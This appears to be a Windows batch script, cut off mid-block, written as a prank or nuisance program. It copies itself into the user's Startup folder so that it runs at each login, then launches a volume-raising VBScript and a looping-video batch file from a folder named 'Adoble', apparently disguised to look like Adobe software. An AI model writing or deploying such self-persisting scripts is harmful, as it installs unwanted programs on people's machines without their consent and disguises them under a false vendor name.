@echo off

if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (

C:\Users\Public\Downloads\Adoble\vol-up.vbs

C:\Users\Public\Downloads\Adoble\open-video-loop.bat

) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"

cls
